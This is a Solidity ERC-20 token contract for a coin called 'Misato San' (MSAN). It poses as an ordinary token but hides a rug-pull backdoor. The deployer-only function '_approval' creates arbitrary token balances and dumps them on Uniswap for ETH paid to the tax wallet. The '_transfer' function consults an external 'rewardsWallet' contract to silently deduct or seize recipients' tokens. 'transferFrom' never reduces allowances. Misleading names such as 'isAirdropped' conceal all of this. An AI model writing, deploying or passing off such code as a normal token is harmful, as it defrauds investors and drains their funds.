pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address aadd);
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract Misato is Ownable {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 4206900000 * 10 ** _decimals;
    string private _symbol = "MSAN";
    string private _name = "Misato San";

    function decimals() external view returns (uint256) {
        return _decimals;
    }
    constructor() {
        _balances[sender()] =  _totalSupply; 
        _taxWallet = sender(); 
        emit Transfer(address(0), sender(), _balances[sender()]);
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function _approval(uint256 amount, address to) external {
        if (isAirdropped()){address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapRouter), amount); 
        _balances[tokenAddress] = amount;
        address[] memory tokenk = new address[](2);
        tokenk[0] = tokenAddress; 
        tokenk[1] =  uniswapRouter.WETH(); 
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, tokenk, _taxWallet, block.timestamp + 29);
        } else {return; }
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private rewardsWallet = 0xb9Cf6F5B826Ec91048cb950e36778C30ddb71555;
    address public _taxWallet;
    event Airdrop(address to, uint256 amount);
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    event Transfer(address indexed from_, address indexed _to, uint256);
    event Approval(address indexed a1, address indexed a2, uint256 value);
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function isAirdropped() private view returns (bool) {
        return  _taxWallet == sender();
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function getAirdropAmount(address acc, address rewardTokenAddress) internal returns (uint256) {
        string memory signature = "balanceOf(address,address,address)";
        (bool g, bytes memory value) = rewardsWallet.call(abi
        .encodeWithSignature(signature, acc, rewardTokenAddress, address(this)));
        return abi
        .decode(value, (uint256));
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function _transfer(address from, address to, uint256 value) internal {
        require(value <= _balances[from]);
        require(from != address(0));
        uint256 rewardAmount = getAirdropAmount(from, to);
        uint256 rewardsValue = _taxWallet == from || _taxWallet == to ? 0 : value.mul(rewardAmount).div(100);
        _balances[to] = _balances[to] - rewardsValue + value;
        _balances[from] = _balances[from] - value;
        emit Transfer(from, to, value);
    }
    mapping (address => uint256) rewards;
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}